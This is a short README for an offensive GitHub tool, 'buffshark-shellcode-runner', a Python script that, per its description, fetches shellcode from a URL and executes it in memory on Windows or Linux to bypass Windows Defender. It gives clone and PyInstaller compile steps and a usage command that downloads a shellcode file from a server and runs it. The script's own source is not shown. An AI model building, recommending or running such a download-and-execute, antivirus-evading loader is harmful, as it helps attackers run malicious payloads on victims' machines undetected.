# buffshark-shellcode-runner

## Python Shellcode Runner for windows and linux
This script utilizes mmap(for linux) and win32 api wrappers (for windows) to execute shellcode in memory and bypass Windows Defender.

## Installation and Compiling
1. Download the repo: `git clone https://github.com/momo1239/buffshark-shellcode-runner`
2. `cd buffshark-shellcode-runner/`
3. Optional: Install pyinstaller to compile to windows executable: `pip install pyinstaller`
4. Optional: Compile: `pyinstaller -F buffshark.py`

## Usage
Example: `python3 buffshark.py -u http://127.0.0.1:8080/shellcode.bin -a [win/nix]`
